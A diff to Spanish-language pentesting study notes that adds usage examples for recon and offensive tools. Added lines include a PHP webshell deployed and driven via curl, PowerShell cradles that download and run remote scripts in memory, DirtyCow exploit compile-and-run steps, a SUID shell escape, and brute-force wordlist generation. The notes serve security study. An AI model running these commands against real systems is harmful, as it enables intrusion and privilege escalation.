@@ -9,6 +9,16 @@
 # OSINT / Recon
 
 > [!info]- Shodan
+> **Motor de búsqueda que indexa dispositivos y servicios expuestos en internet (banners, puertos, certificados, cámaras, SCADA, etc.), útil para reconocimiento pasivo sin tocar directamente al objetivo.**
+>
+> ## Modo de Uso
+> ```
+> hostname:"inlanefreight.com"       # Busca hosts asociados a un dominio
+> net:10.10.10.0/24                  # Busca dentro de un rango de red
+> port:445                           # Filtra por puerto expuesto
+> product:"Apache httpd"             # Filtra por producto/servicio identificado
+> ```
+> - URL: https://www.shodan.io/
 > ![[Ciberseguridad/HTB Apuntes/Footprinting#Shodan]]
 
 >[!info]- ReconSpider
@@ -43,13 +53,23 @@
 |`dig domain.com ANY`|Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).|
 > ![[Ciberseguridad/HTB Apuntes/Footprinting#Dig]]
 
-> [!info]- Web Certificate Search
+> [!info]- Web Certificate Search (crt.sh)
+> **Busca en logs públicos de Certificate Transparency para descubrir subdominios y dominios relacionados a partir de certificados SSL/TLS emitidos.**
+>
+> ## Modo de Uso
+> ```
+> https://crt.sh/?q=inlanefreight.com        # Busca certificados emitidos para el dominio
+> https://crt.sh/?q=%25.inlanefreight.com    # Usa % como wildcard para listar subdominios
+> ```
 >![[Ciberseguridad/HTB Apuntes/Footprinting#[CRT.SH (Certificate Search)](https //crt.sh/)]]
 
 > [!info]- Toolbox (Email Header Analyzer)
-> Analizador de cabezeras de correos para verificar si es legítimo o no.
-> ## URL
-> https://mxtoolbox.com/
+> **Analiza las cabeceras completas de un correo (rutas SMTP, SPF/DKIM/DMARC, IPs de origen) para verificar si es legítimo o si fue suplantado (phishing).**
+>
+> ## Modo de Uso
+> 1. Abre el correo sospechoso y copia su cabecera completa ("Mostrar original" en Gmail, o "Ver código fuente del mensaje" en Outlook).
+> 2. Pega el contenido en https://mxtoolbox.com/EmailHeaders.aspx
+> 3. Revisa los resultados de SPF, DKIM, DMARC y la ruta de servidores para detectar inconsistencias.
 
 > [!info]- username-anarchy
 > **Genera nombres de usuario a partir de nombres reales (nombre/apellido) para enumeración y fuerza bruta de credenciales.**
@@ -93,10 +113,15 @@ Laudanum is a repository of ready-made files that can be used to inject onto a v
 >- https://github.com/jbarcia/Web-Shells/tree/master/laudanum
 >>[!Important] 
 >>The Laudanum files can be found already installed in the `/usr/share/laudanum` directory.
+>### Modo de Uso
+>```shell
+>cp /usr/share/laudanum/php/shell.php /var/www/html/   # Copia el webshell (o súbelo a través de la vulnerabilidad encontrada, ej. un upload inseguro)
+>curl "http://victima/shell.php?cmd=id"                 # Ejecuta comandos a través del parámetro del webshell
+>```
 ># Reverse Shells
 >These are repositories of reverse shells in Linux, Windows and MacOS.
 >- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
->- https://www.revshells.com/ : Generador de Reverse Shell
+>- https://www.revshells.com/ : Generador de Reverse Shell. Selecciona el tipo de shell (bash, nc, powershell, etc.), tu IP y puerto de escucha, y genera el payload listo para pegar en el objetivo.
 
 > [!info]- Penelope
 > **Controlador de shell que reemplaza a netcat, pensado para simplificar la explotación de RCE y los flujos de post-explotación.**
@@ -142,8 +167,14 @@ Laudanum is a repository of ready-made files that can be used to inject onto a v
 > ```
 
 >[!Info]- Powershell download cradles
->Extensive list of commands in Powershell cradles yo download or invoke for file tranfers.
->- https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+> **Colección de técnicas para descargar y ejecutar código remoto directamente en memoria usando PowerShell, sin dejar el archivo en disco.**
+>
+> ## Modo de Uso
+> ```powershell
+> IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1/script.ps1')   # Descarga y ejecuta un script en memoria
+> powershell -c "IEX(IWR 'http://10.10.10.1/script.ps1' -UseBasicParsing)"        # Variante con Invoke-WebRequest
+> ```
+>- Lista completa: https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
 >[!info]- JavaScript Obfuscation and Deobfuscation
 ># Obfuscation
@@ -197,24 +228,74 @@ var _0xb01ac5=_0x2fcf1e[0x0],_0x1441b2=_0x598f67+_0xb01ac5,_0x2d62a3=_0xab03['lM
 
 >[!info]- HackTricks 
 >Documenta técnicas de explotación, escalada de privilegios, enumeración de servicios, bypass de defensas, etc., organizadas por tecnología/plataforma. Sirve como referencia rápida durante un pentest
+>
+> ## Modo de Uso
+> Navega directamente a la página de la tecnología/plataforma que estás atacando (ej. `linux-hardening/privilege-escalation`, `network-services-pentesting/pentesting-smb`) o usa el buscador del sitio para encontrar el checklist correspondiente.
 >- https://hacktricks.wiki/en/index.html
 
 >[!info]- linPEAS
->Script de enumeración automática para Linux (existe la contraparte winPEAS para Windows). Escanea el sistema en busca de vectores de escalada de privilegios: permisos mal configurados, cron jobs, binarios SUID explotables, credenciales expuestas, kernel vulnerable, etc. Se corre después de obtener acceso inicial (post-explotación) para ahorrar tiempo identificando el camino más probable hacia root, en lugar de enumerar todo manualmente.
->- https://github.com/peass-ng/PEASS-ng
+>**Script de enumeración automática para Linux.** Escanea el sistema en busca de vectores de escalada de privilegios: permisos mal configurados, cron jobs, binarios SUID explotables, credenciales expuestas, kernel vulnerable, etc. Se corre después de obtener acceso inicial (post-explotación) para ahorrar tiempo identificando el camino más probable hacia root, en lugar de enumerar todo manualmente.
+>
+> ## Modo de Uso
+> ```shell
+> curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+> chmod +x linpeas.sh
+> ./linpeas.sh        # Escaneo estándar
+> ./linpeas.sh -a     # Escaneo completo (más lento, incluye más checks)
+> ```
+>- Repositorio: https://github.com/peass-ng/PEASS-ng
+
+>[!info]- winPEAS
+>**Contraparte de linPEAS para Windows.** Enumera automáticamente vectores de escalada de privilegios: servicios mal configurados, AlwaysInstallElevated, credenciales guardadas, tareas programadas, permisos débiles de archivos/registro, etc.
+>
+> ## Modo de Uso
+> ```powershell
+> # Descarga winPEASx64.exe desde las releases del repositorio y transfiérelo al objetivo, luego:
+> .\winPEASx64.exe              # Escaneo completo
+> .\winPEASx64.exe quiet cmd    # Salida reducida, solo resultados relevantes
+> ```
+>- Repositorio: https://github.com/peass-ng/PEASS-ng
 
 >[!info]- DirtyCow
 >## DirtyCow (CVE-2016-5195)
 Repositorio con PoCs de una vulnerabilidad de _race condition_ en el subsistema de memoria del kernel Linux (copy-on-write), que permite escalar privilegios a root desde un usuario sin privilegios. Afecta kernels antiguos (pre-parche 2016).
+>
+> ## Modo de Uso (ejemplo con el PoC de FireFart)
+> ```shell
+> wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+> gcc -pthread dirty.c -o dirty -lcrypt
+> ./dirty <nueva_contraseña>   # Crea/sobreescribe un usuario (firefart) con privilegios root usando la contraseña indicada
+> su firefart                  # Inicia sesión como el usuario root creado por el exploit
+> ```
 >- https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 
 >[!info]- GTFObins
->https://gtfobins.org/
+> **Catálogo de binarios Unix legítimos que pueden abusarse para escapar de shells restringidas, escalar privilegios, transferir archivos o mantener persistencia, aprovechando funciones "normales" del sistema.**
+>
+> ## Modo de Uso
+> 1. Identifica qué binarios tienen permiso SUID o pueden ejecutarse con `sudo`: `find / -perm -4000 2>/dev/null` / `sudo -l`.
+> 2. Busca ese binario en https://gtfobins.org/ y revisa la sección correspondiente (Sudo, SUID, Shell, etc.).
+> 3. Ejecuta el comando sugerido, por ejemplo con `find` con permiso SUID:
+> ```shell
+> find . -exec /bin/sh -p \; -quit
+> ```
+>- https://gtfobins.org/
 
 # Utilidades
 
-> [!info]- Crunch 
-> **WordList Generator**
+> [!info]- Crunch
+> **Genera wordlists personalizadas combinando longitudes y charsets definidos, útil para ataques de fuerza bruta cuando una wordlist genérica (como rockyou) no cubre el patrón esperado.**
+>
+> ## Modo de Uso
+> ```shell
+> crunch 4 6 0123456789 -o numeros.txt                  # Combinaciones de 4 a 6 caracteres usando solo números
+> crunch 8 8 abcdefghijklmnopqrstuvwxyz -o letras.txt    # Combinaciones de 8 caracteres usando solo minúsculas
+> crunch 6 8 -t ,@@^^^ -o patron.txt                     # Usa un patrón fijo: , = mayúscula, @ = minúscula, ^ = símbolo
+> crunch 6 6 -p word1 word2 word3                        # Genera todas las permutaciones de las palabras dadas (ignora min/max length)
+> ```
+> - `-o <archivo>`: Guarda la salida en un archivo en vez de imprimir en pantalla.
+> - `-t <patrón>`: Define un patrón combinando literales y marcadores (`@` minúscula, `,` mayúscula, `%` número, `^` símbolo).
+> - `-p <palabras>`: Genera permutaciones de palabras específicas en lugar de un rango de caracteres.
 
 >[!Info]- Endocers y decoders
 >![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Base64]]
